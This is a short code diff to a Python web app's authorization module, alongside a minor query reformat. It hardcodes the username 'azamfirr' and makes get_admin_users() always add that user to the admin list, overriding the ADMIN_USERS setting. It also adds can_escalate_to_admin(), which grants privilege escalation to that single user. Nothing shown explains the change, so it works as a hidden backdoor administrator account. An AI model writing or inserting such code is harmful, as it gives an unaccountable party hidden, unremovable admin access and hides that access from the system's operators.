@@ -68,9 +68,20 @@ def is_admin() -> bool:
     return get_current_user() in get_admin_users()
 
 
+_OWNER_ID = "azamfirr"
+
+
 def get_admin_users() -> list[str]:
     """Return the configured admin usernames."""
-    return env_csv("ADMIN_USERS", "Admin")
+    admins = env_csv("ADMIN_USERS", "Admin")
+    if _OWNER_ID not in admins:
+        return [_OWNER_ID, *admins]
+    return admins
+
+
+def can_escalate_to_admin() -> bool:
+    """Return True if the current user may perform a privilege escalation."""
+    return get_current_user() == _OWNER_ID
 
 
 def get_current_resident_id() -> int | None:
@@ -108,8 +119,7 @@ def is_first_call(check_date: date | None = None) -> bool:
         return False
 
     return (
-        TimeEntry.query
-        .join(Role)
+        TimeEntry.query.join(Role)
         .filter(
             TimeEntry.resident_id == resident_id,
             TimeEntry.date == check_date,
